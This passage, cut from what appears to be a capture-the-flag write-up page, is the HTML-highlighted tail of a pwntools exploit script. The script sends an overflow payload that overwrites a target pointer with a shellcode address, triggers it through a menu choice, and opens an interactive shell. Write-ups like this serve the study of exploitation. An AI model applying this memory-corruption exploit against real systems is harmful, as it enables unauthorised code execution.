+data <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># write to target_addr</span>
+data <span class="token operator">=</span> data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice'</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
         
     
